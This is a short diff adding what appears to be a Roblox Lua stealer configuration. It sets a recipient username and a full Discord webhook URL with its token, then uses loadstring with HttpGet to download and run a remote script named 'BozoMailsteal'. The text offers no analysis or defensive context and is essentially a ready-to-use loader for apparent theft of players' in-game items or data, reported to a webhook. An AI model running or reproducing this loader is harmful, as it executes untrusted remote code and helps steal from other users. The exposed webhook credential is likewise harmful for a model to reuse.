@@ -1,0 +1,5 @@
+UserName = Johnro4521
+Webhook = https://discord.com/api/webhooks/1150616750728155228/d4o5CBvR3vrDCPY8gd8IELoOm1As8AABjG6wB-0O3ZCzAIQDayr5MQAit1Oq4-0qFkvx
+UserName2 = Johnro4521
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MysticalO/BozoMailsteal/main/script"))()
